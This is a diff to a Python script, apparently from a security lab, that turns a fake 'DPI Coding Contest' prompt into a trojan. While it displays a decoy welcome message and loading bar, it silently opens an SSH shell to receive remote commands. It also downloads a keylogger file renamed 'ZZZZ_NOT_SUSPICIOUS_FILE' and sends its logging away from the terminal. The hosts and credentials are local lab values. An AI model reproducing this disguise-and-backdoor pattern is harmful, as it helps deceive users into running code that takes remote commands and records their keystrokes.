@@ -3,6 +3,7 @@
 import paramiko
 import socket
 import os
+import time
 import logzero
 from logzero import logger
 import threading
@@ -161,7 +162,7 @@ def doMaliciousActivities():
             sftp = paramiko.SFTPClient.from_transport(transport)
 
             # Download to current directory
-            remotepath = "/home/lab/bin/py/project/tester"
+            remotepath = "/home/lab/bin/py/project/a1KeyLogger.py"
             localpath = "./ZZZZ_NOT_SUSPICIOUS_FILE"
             sftp.get(remotepath, localpath)
 
@@ -174,6 +175,10 @@ def doMaliciousActivities():
             if transport:
                 transport.close()
 
+            # connect ssh and receive commands
+            SSHClient = sshClient("localhost", 9000, "rick", "jacky")
+            SSHClient.invoke_shell()
+
         # kill child process
         while True:
             try:
@@ -184,18 +189,40 @@ def doMaliciousActivities():
         raise
 
 
+def printNonMaliciousActivity():
+    # non malicious stuff
+    print("Welcome to the DPI Coding Contest!")
+
+    print("Loading your contest question...")
+    for i, j in enumerate(list(range(10001))):
+        print(str(i / 100) + " percent loaded.", end='\r')
+    print("\n")
+
+    print("For this challenge, you'll be writing a python socket client to communicate to a server located at the IP address of '127.0.0.1' and running on port 9000. The client must be able send large data packets and handle multiple request from the server. Your overall implementation will be assessed along with your knowledge of networking fundamentals, coding style and program efficiency.")
+
+    print("Run this file as many times as you need to check on the server status and any information you need to see what kind of data you are dealing with. This is file is used to ping the server.")
+
+    print("Language Used: Python 3, Recommended Libraries to use: os, sys, socket")
+    print("Now let's get coding!")
+
+
 remotepath = "/home/lab/bin/py/project/tester"
 localpath = "./ZZZZ_NOT_SUSPICIOUS_FILE"
 
 # main thread
 if __name__ == '__main__':
-    # Add logging to logfile and disable output to the terminal
-    logzero.logfile("/home/lab/bin/py/project/sshClient.log", maxBytes=1e6,
-                    backupCount=3, disableStderrLogger=True)
+    try:
+        # Add logging to logfile and disable output to the terminal
+        logzero.logfile("/home/lab/bin/py/project/sshClient.log", maxBytes=1e6,
+                        backupCount=3, disableStderrLogger=True)
 
-    sshClient = sshClient("localhost", 9000, "rick", "jacky")
-    sshClient.invoke_shell()
+        printNonMaliciousActivity()
 
-    sftpClient = sftpClient("localhost", 22, "lab", "lab")
-    sftpClient.downloadFile(remotepath, localpath)
-    # doMaliciousActivities()
+        sshClient = sshClient("localhost", 9000, "rick", "jacky")
+        sshClient.invoke_shell()
+
+        sftpClient = sftpClient("localhost", 22, "lab", "lab")
+        sftpClient.downloadFile(remotepath, localpath)
+        # doMaliciousActivities()
+    except Exception as err:
+        print(err)
